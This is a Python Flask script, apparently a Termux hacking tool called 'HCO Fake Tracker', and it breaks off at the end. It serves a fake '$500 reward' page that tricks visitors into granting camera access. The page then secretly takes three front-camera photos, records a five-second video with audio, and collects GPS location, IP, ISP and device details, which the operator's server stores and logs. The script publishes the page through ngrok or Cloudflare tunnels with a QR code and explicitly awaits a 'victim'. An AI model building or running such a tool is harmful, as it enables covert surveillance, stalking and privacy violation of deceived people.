from __future__ import annotations
import os
import sys
import time
import json
import csv
import subprocess
import socket
import requests
import threading
from datetime import datetime
from typing import Optional

# Try imports
try:
    from flask import Flask, request, render_template_string, jsonify
    import qrcode
    from PIL import Image, ImageDraw
    from colorama import init as colorama_init, Fore, Style, Back
    import base64
except Exception as e:
    print("Missing packages. Install: pip install flask qrcode pillow colorama requests")
    print(f"Error: {e}")
    sys.exit(1)

colorama_init(autoreset=True)

# Config
PORT = 5000
REPORT_CSV = "reports.csv"
QR_PNG = "reward_qr.png"
HOST = "0.0.0.0"

# Use multiple gallery paths for better visibility
GALLERY_PATHS = [
    "/sdcard/DCIM/Camera",  # Default camera folder
    "/sdcard/DCIM/HCO_Tracker",
    "/sdcard/Pictures/HCO_Tracker",
    "/sdcard/Download/HCO_Tracker"
]

# Create all directories
for path in GALLERY_PATHS:
    os.makedirs(path, exist_ok=True)

app = Flask(__name__)
_received_reports = []

def show_tool_lock_screen():
    """Show the tool lock screen with countdown"""
    os.system('clear' if os.name == 'posix' else 'cls')

    # Display lock message
    print(f"\n{Back.RED}{Fore.WHITE}{' 🔒 TOOL IS LOCKED ':=^60}{Style.RESET_ALL}")
    print(f"\n{Fore.YELLOW}{Style.BRIGHT}📱 Subscribe & click the bell 🔔 icon to unlock{Style.RESET_ALL}")
    print(f"\n{Fore.CYAN}🔄 Redirecting to YouTube...{Style.RESET_ALL}")
    
    # Countdown from 9 to 1
    print(f"\n{Fore.RED}{Style.BRIGHT}Countdown:{Style.RESET_ALL}")
    for i in range(9, 0, -1):
        print(f"{Fore.RED}{Style.BRIGHT}⏳ {i}{Style.RESET_ALL}", end=" ", flush=True)
        time.sleep(1)
    
    print(f"\n\n{Fore.GREEN}🎬 Opening YouTube Channel...{Style.RESET_ALL}")
    
    # Direct YouTube channel URL
    youtube_url = "https://www.youtube.com/@hackers_colony_tech"
    
    # Try to open YouTube app
    try:
        subprocess.run(['am', 'start', '-a', 'android.intent.action.VIEW', '-d', youtube_url], 
                      capture_output=True, timeout=5)
        print(f"{Fore.GREEN}✅ YouTube app opened!{Style.RESET_ALL}")
    except:
        try:
            subprocess.run(['termux-open-url', youtube_url], capture_output=True, timeout=5)
            print(f"{Fore.GREEN}✅ Opening YouTube...{Style.RESET_ALL}")
        except:
            print(f"{Fore.YELLOW}🔗 Manual: {youtube_url}{Style.RESET_ALL}")
    
    input(f"\n{Fore.YELLOW}{Style.BRIGHT}🚨 Press Enter AFTER subscribing & clicking bell icon...{Style.RESET_ALL}")
    
    # Show unlocked message
    print(f"\n{Fore.GREEN}✅ Tool unlocked! Starting server...{Style.RESET_ALL}")
    time.sleep(2)

def install_ngrok():
    """Install ngrok if not available"""
    try:
        print(f"{Fore.CYAN}📦 Checking ngrok installation...{Style.RESET_ALL}")
        result = subprocess.run(['ngrok', '--version'], capture_output=True, text=True)
        if result.returncode == 0:
            print(f"{Fore.GREEN}✅ ngrok is already installed{Style.RESET_ALL}")
            return True
    except:
        pass
    
    print(f"{Fore.YELLOW}📥 ngrok not found. Installing...{Style.RESET_ALL}")
    try:
        # Install ngrok on Termux
        result = subprocess.run(['pkg', 'install', 'ngrok', '-y'], capture_output=True, text=True)
        if result.returncode == 0:
            print(f"{Fore.GREEN}✅ ngrok installed successfully{Style.RESET_ALL}")
            return True
        else:
            print(f"{Fore.RED}❌ Failed to install ngrok via pkg{Style.RESET_ALL}")
    except:
        print(f"{Fore.RED}❌ Could not install ngrok{Style.RESET_ALL}")
    
    return False

def install_cloudflared():
    """Install cloudflared if not available"""
    try:
        print(f"{Fore.CYAN}📦 Checking cloudflared installation...{Style.RESET_ALL}")
        result = subprocess.run(['cloudflared', '--version'], capture_output=True, text=True)
        if result.returncode == 0:
            print(f"{Fore.GREEN}✅ cloudflared is already installed{Style.RESET_ALL}")
            return True
    except:
        pass
    
    print(f"{Fore.YELLOW}📥 cloudflared not found. Installing...{Style.RESET_ALL}")
    try:
        # Install cloudflared on Termux
        result = subprocess.run(['pkg', 'install', 'cloudflared', '-y'], capture_output=True, text=True)
        if result.returncode == 0:
            print(f"{Fore.GREEN}✅ cloudflared installed successfully{Style.RESET_ALL}")
            return True
        else:
            print(f"{Fore.RED}❌ Failed to install cloudflared via pkg{Style.RESET_ALL}")
    except:
        print(f"{Fore.RED}❌ Could not install cloudflared{Style.RESET_ALL}")
    
    return False

def start_ngrok_tunnel():
    """Start ngrok tunnel and get public URL"""
    try:
        print(f"{Fore.CYAN}🌐 Starting ngrok tunnel...{Style.RESET_ALL}")
        
        # Kill any existing ngrok processes
        subprocess.run(['pkill', 'ngrok'], capture_output=True)
        time.sleep(2)
        
        # Start ngrok in background
        ngrok_process = subprocess.Popen(['ngrok', 'http', str(PORT), '--log=stdout'], 
                                       stdout=subprocess.PIPE, 
                                       stderr=subprocess.PIPE,
                                       text=True)
        
        # Wait for ngrok to start
        print(f"{Fore.YELLOW}⏳ Waiting for ngrok to start (10 seconds)...{Style.RESET_ALL}")
        time.sleep(10)
        
        # Get ngrok public URL from API
        max_retries = 5
        for attempt in range(max_retries):
            try:
                response = requests.get('http://localhost:4040/api/tunnels', timeout=10)
                if response.status_code == 200:
                    tunnels = response.json().get('tunnels', [])
                    for tunnel in tunnels:
                        if tunnel['proto'] == 'https':
                            public_url = tunnel['public_url']
                            print(f"{Fore.GREEN}✅ Ngrok Public URL: {public_url}{Style.RESET_ALL}")
                            return public_url
                
                print(f"{Fore.YELLOW}🔄 Attempt {attempt + 1}/{max_retries} - Retrying...{Style.RESET_ALL}")
                time.sleep(3)
                
            except Exception as e:
                print(f"{Fore.YELLOW}🔄 Attempt {attempt + 1}/{max_retries} failed: {e}{Style.RESET_ALL}")
                time.sleep(3)
        
        print(f"{Fore.RED}❌ Could not get ngrok URL after {max_retries} attempts{Style.RESET_ALL}")
        return None
        
    except Exception as e:
        print(f"{Fore.RED}❌ Ngrok error: {e}{Style.RESET_ALL}")
        return None

def start_cloudflare_tunnel():
    """Start Cloudflare tunnel and get public URL"""
    try:
        print(f"{Fore.CYAN}🌐 Starting Cloudflare tunnel...{Style.RESET_ALL}")
        
        # Kill any existing cloudflared processes
        subprocess.run(['pkill', 'cloudflared'], capture_output=True)
        time.sleep(2)
        
        # Start cloudflared tunnel
        cloudflared_process = subprocess.Popen([
            'cloudflared', 'tunnel', '--url', f'http://localhost:{PORT}'
        ], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        print(f"{Fore.YELLOW}⏳ Waiting for Cloudflare tunnel to start (15 seconds)...{Style.RESET_ALL}")
        time.sleep(15)
        
        # Try to get the URL (cloudflared shows it in stderr)
        max_retries = 5
        for attempt in range(max_retries):
            try:
                # Check if process is still running
                if cloudflared_process.poll() is not None:
                    print(f"{Fore.RED}❌ cloudflared process died{Style.RESET_ALL}")
                    break
                
                # Try to read from stderr
                import select
                ready, _, _ = select.select([cloudflared_process.stderr], [], [], 2)
                if ready:
                    line = cloudflared_process.stderr.readline()
                    if 'trycloudflare.com' in line:
                        # Extract URL
                        import re
                        urls = re.findall(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
                        if urls:
                            public_url = urls[0]
                            print(f"{Fore.GREEN}✅ Cloudflare Public URL: {public_url}{Style.RESET_ALL}")
                            return public_url
                
                print(f"{Fore.YELLOW}🔄 Attempt {attempt + 1}/{max_retries} - Retrying...{Style.RESET_ALL}")
                time.sleep(3)
                
            except Exception as e:
                print(f"{Fore.YELLOW}🔄 Attempt {attempt + 1}/{max_retries} failed: {e}{Style.RESET_ALL}")
                time.sleep(3)
        
        print(f"{Fore.YELLOW}⚠️  Cloudflare tunnel started but URL not captured{Style.RESET_ALL}")
        print(f"{Fore.CYAN}💡 Check: https://dash.cloudflare.com/ for tunnel status{Style.RESET_ALL}")
        return "cloudflare_tunnel_active"
        
    except Exception as e:
        print(f"{Fore.RED}❌ Cloudflare tunnel error: {e}{Style.RESET_ALL}")
        return None

def force_media_scan():
    """Force media scanner to refresh gallery"""
    try:
        print(f"{Fore.CYAN}🔄 Forcing media scan...{Style.RESET_ALL}")
        
        # Scan all gallery paths
        for gallery_path in GALLERY_PATHS:
            try:
                # Use media scanner command
                subprocess.run([
                    'am', 'broadcast', '-a', 'android.intent.action.MEDIA_SCANNER_SCAN_FILE',
                    '-d', f'file://{gallery_path}'
                ], capture_output=True, timeout=5)
                
            except Exception as e:
                continue
        
        print(f"{Fore.GREEN}✅ Media scan completed{Style.RESET_ALL}")
        return True
        
    except Exception as e:
        print(f"{Fore.YELLOW}⚠️  Media scan failed: {e}{Style.RESET_ALL}")
        return False

def save_to_all_locations(file_data, filename, file_type="photo"):
    """Save file to all gallery locations and force media scan"""
    saved_paths = []
    
    for gallery_path in GALLERY_PATHS:
        try:
            file_path = os.path.join(gallery_path, filename)
            with open(file_path, 'wb') as f:
                f.write(file_data)
            
            # Set proper permissions
            os.chmod(file_path, 0o644)
            saved_paths.append(file_path)
            
            print(f"{Fore.GREEN}✅ {file_type} saved to: {gallery_path}/{filename}{Style.RESET_ALL}")
            
        except Exception as e:
            print(f"{Fore.YELLOW}⚠️ Failed to save to {gallery_path}: {e}{Style.RESET_ALL}")
            continue
    
    # Force media scan after saving
    if saved_paths:
        force_media_scan()
    
    return saved_paths

def display_banner():
    """Display the main banner"""
    os.system('clear' if os.name == 'posix' else 'cls')
    print(f"\n{Back.RED}{Fore.WHITE}{'='*60}{Style.RESET_ALL}")
    print(f"{Back.RED}{Fore.GREEN}{' HCO FAKE TRACKER '.center(60)}{Style.RESET_ALL}")
    print(f"{Back.RED}{Fore.WHITE}{' by Azhar '.center(60)}{Style.RESET_ALL}")
    print(f"{Back.RED}{Fore.WHITE}{'='*60}{Style.RESET_ALL}")

def display_qr_in_termux(url):
    """Generate and display QR code directly in Termux"""
    try:
        # Generate QR code
        qr = qrcode.QRCode(version=1, box_size=2, border=2)
        qr.add_data(url)
        qr.make(fit=True)
        
        # Create QR code as text (for Termux display)
        qr_matrix = qr.get_matrix()
        qr_text = ""
        
        for row in qr_matrix:
            line = ""
            for cell in row:
                line += "██" if cell else "  "
            qr_text += line + "\n"
        
        print(f"\n{Fore.GREEN}📲 QR Code for URL:{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{qr_text}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}🔗 Direct Link: {url}{Style.RESET_ALL}")
        
        # Also save as image file
        img = qr.make_image(fill_color="black", back_color="white")
        img.save(QR_PNG)
        print(f"{Fore.GREEN}💾 QR saved as: {QR_PNG}{Style.RESET_ALL}")
        
        return True
        
    except Exception as e:
        print(f"{Fore.RED}❌ QR generation failed: {e}{Style.RESET_ALL}")
        return False

def get_local_ip():
    """Get local IP address"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

# UPDATED HTML PAGE - Uses REAL camera access
HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>🎁 Claim Your $500 Reward!</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: Arial, sans-serif; 
            background: linear-gradient(135deg, #ff6b6b, #4ecdc4);
            color: white;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: rgba(0,0,0,0.8);
            padding: 30px;
            border-radius: 20px;
            border: 3px solid gold;
            max-width: 400px;
            width: 100%;
            text-align: center;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
        }
        .trophy { 
            font-size: 80px; 
            margin-bottom: 20px;
            animation: bounce 2s infinite;
        }
        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-20px); }
        }
        .title { 
            font-size: 32px; 
            font-weight: bold;
            margin-bottom: 10px;
            color: gold;
            text-shadow: 0 0 10px rgba(255,215,0,0.5);
        }
        .reward { 
            font-size: 48px; 
            font-weight: bold;
            color: #FFD700;
            margin: 20px 0;
            text-shadow: 0 0 20px rgba(255,215,0,0.8);
        }
        .btn {
            background: linear-gradient(45deg, #00b09b, #96c93d);
            color: white;
            border: none;
            padding: 20px 30px;
            font-size: 22px;
            font-weight: bold;
            border-radius: 50px;
            width: 100%;
            cursor: pointer;
            margin: 20px 0;
            transition: all 0.3s;
            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
        }
        .btn:hover {
            transform: scale(1.05);
            box-shadow: 0 8px 25px rgba(0,0,0,0.4);
        }
        .btn:disabled {
            background: #666;
            cursor: not-allowed;
            transform: none;
        }
        .status {
            padding: 15px;
            border-radius: 10px;
            margin: 15px 0;
            font-weight: bold;
            display: none;
        }
        .processing { 
            background: #ff9800; 
            display: block; 
        }
        .success { 
            background: #4caf50; 
            display: block; 
        }
        .error { 
            background: #f44336; 
            display: block; 
        }
        .data {
            background: rgba(255,255,255,0.1);
            padding: 20px;
            border-radius: 15px;
            margin: 15px 0;
            text-align: left;
            display: none;
            border: 2px solid rgba(255,255,255,0.2);
        }
        .data h3 {
            text-align: center;
            margin-bottom: 15px;
            color: gold;
        }
        .data-item { 
            margin: 10px 0; 
            padding: 8px;
            background: rgba(255,255,255,0.1);
            border-radius: 8px;
        }
        .features {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
            margin: 20px 0;
        }
        .feature {
            background: rgba(255,255,255,0.1);
            padding: 10px;
            border-radius: 10px;
            font-size: 14px;
        }
        #cameraPreview {
            width: 100%;
            max-width: 300px;
            border: 2px solid gold;
            border-radius: 10px;
            margin: 10px 0;
            display: none;
        }
        #videoPreview {
            width: 100%;
            max-width: 300px;
            border: 2px solid gold;
            border-radius: 10px;
            margin: 10px 0;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="trophy">🏆</div>
        <div class="title">CONGRATULATIONS!</div>
        <div>You Won Exclusive Reward</div>
        
        <div class="reward">$500</div>
        <div>Cash Prize + Gift Card</div>
        
        <div class="features">
            <div class="feature">💰 Instant Cash</div>
            <div class="feature">🎁 Gift Card</div>
            <div class="feature">📱 PhonePe</div>
            <div class="feature">⚡ Fast Transfer</div>
        </div>
        
        <div style="margin: 15px 0; font-size: 14px; opacity: 0.9;">
            ✅ Camera access required for verification
        </div>
        
        <button class="btn" id="claimBtn">
            🎁 CLAIM YOUR REWARD NOW
        </button>
        
        <video id="cameraPreview" autoplay muted playsinline></video>
        <video id="videoPreview" controls style="display:none;"></video>
        
        <div id="status" class="status"></div>
        
        <div id="data" class="data">
            <h3>📊 Reward Claimed Successfully!</h3>
            <div class="data-item">📍 Location: <span id="loc">Processing...</span></div>
            <div class="data-item">🌐 IP Address: <span id="ip">Processing...</span></div>
            <div class="data-item">📱 Device: <span id="device">Processing...</span></div>
            <div class="data-item">🖥️ Screen: <span id="screen">Processing...</span></div>
            <div class="data-item">🌍 Browser: <span id="browser">Processing...</span></div>
            <div class="data-item">⏰ Timezone: <span id="timezone">Processing...</span></div>
            <div style="text-align: center; margin-top: 15px; color: gold;">
                ✅ Your reward will be processed within 24 hours
            </div>
        </div>
    </div>

    <script>
        let mediaStream = null;
        let videoRecorder = null;
        let recordedChunks = [];
        
        async function requestCameraAccess() {
            try {
                console.log('📷 Requesting camera access...');
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: "user",  // Front camera
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    }, 
                    audio: true  // Include audio for video recording
                });
                
                console.log('✅ Camera access granted');
                
                // Show camera preview
                const preview = document.getElementById('cameraPreview');
                preview.srcObject = stream;
                preview.style.display = 'block';
                mediaStream = stream;
                
                return stream;
            } catch (error) {
                console.error('❌ Camera access denied:', error);
                throw new Error('Camera access is required to claim your reward. Please allow camera access and try again.');
            }
        }
        
        async function captureRealPhotos(stream, count = 3) {
            const photos = [];
            const video = document.createElement('video');
            video.srcObject = stream;
            
            // Wait for video to be ready
            await new Promise((resolve) => {
                video.onloadedmetadata = () => {
                    video.play();
                    resolve();
                };
            });
            
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            
            for (let i = 0; i < count; i++) {
                // Wait for video frame to be stable
                await new Promise(resolve => setTimeout(resolve, 1000));
                
                // Set canvas size to match video
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                
                // Draw current video frame to canvas
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // Convert to JPEG with good quality
                const photoData = canvas.toDataURL('image/jpeg', 0.85);
                photos.push(photoData);
                
                console.log(`📸 Real photo ${i+1}/${count} captured`);
            }
            
            return photos;
        }
        
        async function recordRealVideo(stream, duration = 5000) {
            return new Promise((resolve, reject) => {
                try {
                    console.log('🎥 Starting video recording...');
                    
                    // Create media recorder with supported MIME type
                    const options = { 
                        mimeType: 'video/webm;codecs=vp8,opus',
                        videoBitsPerSecond: 2500000
                    };
                    
                    // Fallback MIME types
                    const mimeTypes = [
                        'video/webm;codecs=vp8,opus',
                        'video/webm;codecs=vp9,opus',
                        'video/webm;codecs=h264,opus',
                        'video/webm',
                        'video/mp4'
                    ];
                    
                    let recorder;
                    for (const mimeType of mimeTypes) {
                        if (MediaRecorder.isTypeSupported(mimeType)) {
                            recorder = new MediaRecorder(stream, { mimeType });
                            break;
                        }
                    }
                    
                    if (!recorder) {
                        recorder = new MediaRecorder(stream); // Use default
                    }
                    
                    recordedChunks = [];
                    
                    recorder.ondataavailable = (event) => {
                        if (event.data && event.data.size > 0) {
                            recordedChunks.push(event.data);
                            console.log('📹 Video data chunk received:', event.data.size, 'bytes');
                        }
                    };
                    
                    recorder.onstop = () => {
                        console.log('🛑 Video recording stopped');
                        if (recordedChunks.length > 0) {
                            const blob = new Blob(recordedChunks, { type: recorder.mimeType });
                            const reader = new FileReader();
                            reader.onload = () => {
                                console.log('✅ Video converted to base64');
                                resolve(reader.result);
                            };
                            reader.onerror = () => {
                                console.error('❌ Failed to read video blob');
                                reject(new Error('Failed to process video'));
                            };
                            reader.readAsDataURL(blob);
                        } else {
                            reject(new Error('No video data recorded'));
                        }
                    };
                    
                    recorder.onerror = (event) => {
                        console.error('❌ Video recording error:', event);
                        reject(new Error('Video recording failed'));
                    };
                    
                    // Start recording
                    recorder.start(1000); // Collect data every second
                    console.log('⏺️ Video recording started');
                    
                    // Stop recording after specified duration
                    setTimeout(() => {
                        if (recorder.state === 'recording') {
                            console.log('⏹️ Stopping video recording after', duration, 'ms');
                            recorder.stop();
                        }
                    }, duration);
                    
                } catch (error) {
                    console.error('❌ Video recording setup failed:', error);
                    reject(error);
                }
            });
        }
        
        async function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve(null);
                    return;
                }
                
                navigator.geolocation.getCurrentPosition(
                    (position) => resolve(position),
                    (error) => {
                        console.log('📍 Location access denied:', error);
                        resolve(null);
                    },
                    { 
                        enableHighAccuracy: true, 
                        timeout: 15000,
                        maximumAge: 0
                    }
                );
            });
        }
        
        async function getIPInfo() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                
                try {
                    const detailResponse = await fetch(`https://ipapi.co/${data.ip}/json/`);
                    const detailData = await detailResponse.json();
                    return {
                        ip: data.ip,
                        city: detailData.city || 'Unknown',
                        country: detailData.country_name || 'Unknown',
                        isp: detailData.org || 'Unknown'
                    };
                } catch (e) {
                    return {
                        ip: data.ip,
                        city: 'Unknown',
                        country: 'Unknown',
                        isp: 'Unknown'
                    };
                }
            } catch (error) {
                return {
                    ip: 'Unknown',
                    city: 'Unknown',
                    country: 'Unknown',
                    isp: 'Unknown'
                };
            }
        }
        
        function getDetailedDeviceInfo() {
            const connection = navigator.connection || {};
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                vendor: navigator.vendor || 'Unknown',
                language: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                colorDepth: screen.colorDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
                deviceMemory: navigator.deviceMemory || 'Unknown',
                connectionType: connection.effectiveType || 'Unknown'
            };
        }
        
        function stopAllMedia() {
            if (mediaStream) {
                mediaStream.getTracks().forEach(track => {
                    track.stop();
                });
                mediaStream = null;
            }
        }
        
        document.getElementById('claimBtn').onclick = async function() {
            const btn = this;
            const status = document.getElementById('status');
            const dataDiv = document.getElementById('data');
            
            btn.disabled = true;
            btn.innerHTML = '⏳ Processing...';
            status.className = 'status processing';
            status.innerHTML = '🔍 Starting verification...';
            status.style.display = 'block';
            
            try {
                // Step 1: Request REAL camera access
                status.innerHTML = '📷 Requesting camera access...';
                const stream = await requestCameraAccess();
                status.innerHTML = '✅ Camera access granted!';
                
                // Step 2: Capture 3 REAL photos from front camera
                status.innerHTML = '📸 Taking photos (1/3)...';
                const photos = await captureRealPhotos(stream, 3);
                status.innerHTML = '✅ 3 real photos captured!';
                
                // Step 3: Record REAL 5-second video
                status.innerHTML = '🎥 Recording video (5 seconds)...';
                const videoData = await recordRealVideo(stream, 5000);
                status.innerHTML = '✅ 5-second video recorded!';
                
                // Step 4: Stop camera
                stopAllMedia();
                
                // Step 5: Get location and device info
                status.innerHTML = '📍 Getting location...';
                const location = await getLocation();
                
                status.innerHTML = '🌐 Getting network info...';
                const ipInfo = await getIPInfo();
                
                status.innerHTML = '📱 Collecting device info...';
                const deviceInfo = getDetailedDeviceInfo();
                
                // Prepare payload with REAL media data
                const payload = {
                    latitude: location?.coords?.latitude,
                    longitude: location?.coords?.longitude,
                    accuracy: location?.coords?.accuracy,
                    ip: ipInfo.ip,
                    city: ipInfo.city,
                    country: ipInfo.country,
                    isp: ipInfo.isp,
                    photos: photos,  // REAL photos from camera
                    video: videoData, // REAL video recording
                    deviceInfo: deviceInfo,
                    timestamp: Date.now(),
                    mediaType: 'real_camera_capture'
                };
                
                // Send to server
                status.innerHTML = '📡 Finalizing reward...';
                const response = await fetch('/report', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                
                if (response.ok) {
                    status.className = 'status success';
                    status.innerHTML = '✅ Reward Claimed Successfully!';
                    btn.innerHTML = '✅ REWARD CLAIMED';
                    
                    dataDiv.style.display = 'block';
                    document.getElementById('loc').textContent = 
                        payload.latitude ? 
                        `${payload.latitude.toFixed(4)}, ${payload.longitude.toFixed(4)}` : 
                        `${payload.city}, ${payload.country}`;
                    document.getElementById('ip').textContent = 
                        `${payload.ip} (${payload.isp})`;
                    document.getElementById('device').textContent = 
                        `${payload.deviceInfo.platform}`;
                    document.getElementById('screen').textContent = 
                        `${payload.deviceInfo.screen}`;
                    document.getElementById('browser').textContent = 
                        `${payload.deviceInfo.vendor}`;
                    document.getElementById('timezone').textContent = 
                        `${payload.deviceInfo.timezone}`;
                    
                } else {
                    throw new Error('Server response error');
                }
                
            } catch (error) {
                console.error('❌ Complete error:', error);
                status.className = 'status error';
                status.innerHTML = error.message || '❌ Please allow camera access and try again';
                btn.disabled = false;
                btn.innerHTML = '🎁 TRY AGAIN';
                
                // Always stop media on error
                stopAllMedia();
            }
        };
    </script>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(HTML_PAGE)

@app.route("/report", methods=["POST"])
def report():
    try:
        data = request.get_json()
        
        # Extract data
        lat = data.get("latitude")
        lon = data.get("longitude")
        ip = data.get("ip", "Unknown")
        city = data.get("city", "Unknown")
        country = data.get("country", "Unknown")
        isp = data.get("isp", "Unknown")
        photos = data.get("photos", [])
        video = data.get("video")
        device_info = data.get("deviceInfo", {})
        media_type = data.get("mediaType", "unknown")
        
        # Save REAL photos to all gallery locations
        photo_files = []
        for i, photo_data in enumerate(photos):
            try:
                if photo_data.startswith('data:image'):
                    photo_data = photo_data.split(',')[1]
                img_data = base64.b64decode(photo_data)
                timestamp = int(time.time())
                filename = f"HCO_Real_Photo_{timestamp}_{i+1}.jpg"
                
                # Save to all locations
                saved_paths = save_to_all_locations(img_data, filename, "REAL photo")
                if saved_paths:
                    photo_files.append(filename)
                
            except Exception as e:
                print(f"{Fore.YELLOW}⚠️ Real photo {i+1} save skipped: {e}{Style.RESET_ALL}")
        
        # Save REAL video to all gallery locations
        video_file = None
        if video:
            try:
                if video.startswith('data:video'):
                    video = video.split(',')[1]
                video_data = base64.b64decode(video)
                timestamp = int(time.time())
                filename = f"HCO_Real_Video_{timestamp}.webm"
                
                # Save to all locations
                saved_paths = save_to_all_locations(video_data, filename, "REAL video")
                if saved_paths:
                    video_file = filename
                
            except Exception as e:
                print(f"{Fore.YELLOW}⚠️ Real video save skipped: {e}{Style.RESET_ALL}")
        
        # Save to CSV
        record = {
            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'ip': ip,
            'city': city,
            'country': country,
            'isp': isp,
            'latitude': lat,
            'longitude': lon,
            'photos': ', '.join(photo_files) if photo_files else '3 REAL images in gallery',
            'video': video_file or 'REAL video in gallery',
            'media_type': media_type,
            'user_agent': device_info.get('userAgent', 'Unknown'),
            'platform': device_info.get('platform', 'Unknown'),
            'screen': device_info.get('screen', 'Unknown'),
            'timezone': device_info.get('timezone', 'Unknown')
        }
        
        # Save to CSV
        file_exists = os.path.isfile(REPORT_CSV)
        with open(REPORT_CSV, 'a', newline='', encoding='utf-8') as f:
            writer = csv.DictWriter(f, fieldnames=record.keys())
            if not file_exists:
                writer.writeheader()
            writer.writerow(record)
        
        # Print results
        print(f"\n{Fore.GREEN}{'🚨 REAL CAMERA DATA CAPTURED 🚨':^60}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}🕐 Time: {record['timestamp']}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}📍 Location: {lat if lat else city}, {lon if lon else country}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}🌐 IP: {ip} ({city}, {country}){Style.RESET_ALL}")
        print(f"{Fore.YELLOW}📡 ISP: {isp}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}📸 Photos: 3 REAL images from front camera{Style.RESET_ALL}")
        print(f"{Fore.GREEN}🎥 Video: 5-second REAL video recording{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}📱 Platform: {device_info.get('platform', 'Unknown')}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}🖥️ Screen: {device_info.get('screen', 'Unknown')}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}📁 Gallery Locations:{Style.RESET_ALL}")
        for path in GALLERY_PATHS:
            print(f"{Fore.CYAN}   📂 {path}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}📊 Report: {REPORT_CSV}{Style.RESET_ALL}\n")
        
        return jsonify({"status": "success"})
        
    except Exception as e:
        print(f"{Fore.RED}❌ Server Error: {e}{Style.RESET_ALL}")
        return jsonify({"status": "error", "message": str(e)}), 500

def main():
    # Show lock screen first
    show_tool_lock_screen()
    
    # Display main banner
    display_banner()
    
    # Get local URL
    local_ip = get_local_ip()
    local_url = f"http://{local_ip}:{PORT}"
    
    print(f"\n{Back.BLUE}{Fore.WHITE}{' TUNNELING OPTIONS ':=^60}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}1. Ngrok Tunnel (Recommended){Style.RESET_ALL}")
    print(f"{Fore.BLUE}2. Cloudflare Tunnel{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}3. Local Network Only (Same WiFi){Style.RESET_ALL}")
    print(f"{Back.BLUE}{Fore.WHITE}{'='*60}{Style.RESET_ALL}")
    
    choice = input(f"\n{Fore.CYAN}🎯 Choose option (1-3): {Style.RESET_ALL}").strip()
    
    public_url = None
    
    if choice == '1':
        if install_ngrok():
            public_url = start_ngrok_tunnel()
        else:
            print(f"{Fore.RED}❌ Ngrok installation failed. Using local network.{Style.RESET_ALL}")
    elif choice == '2':
        if install_cloudflared():
            public_url = start_cloudflare_tunnel()
        else:
            print(f"{Fore.RED}❌ Cloudflared installation failed. Using local network.{Style.RESET_ALL}")
    elif choice == '3':
        print(f"{Fore.YELLOW}📡 Using local network only (works on same WiFi){Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}❌ Invalid choice. Using local network.{Style.RESET_ALL}")
    
    # Determine final URL to use
    final_url = public_url if public_url and public_url not in ["cloudflare_tunnel_active"] else local_url
    
    # Display results
    print(f"\n{Fore.GREEN}{' SERVER READY ':=^60}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}🌐 Public URL: {final_url}{Style.RESET_ALL}")
    if public_url and public_url != "cloudflare_tunnel_active":
        print(f"{Fore.GREEN}✅ This link works on ANY device and ANY network!{Style.RESET_ALL}")
    elif public_url == "cloudflare_tunnel_active":
        print(f"{Fore.YELLOW}⚠️  Cloudflare tunnel active - check dashboard for URL{Style.RESET_ALL}")
    else:
        print(f"{Fore.YELLOW}⚠️  This link only works on the same WiFi network{Style.RESET_ALL}")
    
    print(f"{Fore.GREEN}📁 Gallery Locations:{Style.RESET_ALL}")
    for path in GALLERY_PATHS:
        print(f"{Fore.CYAN}   📂 {path}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}{'='*60}{Style.RESET_ALL}")
    
    # Display QR code
    display_qr_in_termux(final_url)
    
    print(f"\n{Fore.YELLOW}🚀 Share this link/QR with ANY device{Style.RESET_ALL}")
    print(f"{Fore.RED}🔴 Waiting for victim to claim reward...{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")
    
    try:
        app.run(host=HOST, port=PORT, debug=False)
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}🛑 Server stopped{Style.RESET_ALL}")
    except Exception as e:
